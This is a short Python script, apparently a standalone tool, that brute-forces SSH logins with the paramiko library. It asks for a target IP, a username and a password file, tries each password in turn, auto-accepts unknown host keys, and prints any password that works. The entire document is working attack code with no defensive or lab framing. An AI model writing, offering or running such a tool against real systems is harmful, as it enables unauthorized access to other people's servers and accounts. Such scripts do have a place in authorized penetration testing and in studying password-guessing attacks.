import paramiko

def ssh_brute_force(host, username, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for password in password_list:
        try:
            client.connect(host, username=username, password=password)
            print(f"[+] Password found: {password}")
            return password
        except paramiko.AuthenticationException:
            continue
    print("[-] No valid password found.")
    return None

if __name__ == "__main__":
    host = input("Enter target IP: ")
    username = input("Enter SSH username: ")
    password_file = input("Enter path to password file: ")
    with open(password_file) as f:
        passwords = f.read().splitlines()
    ssh_brute_force(host, username, passwords)
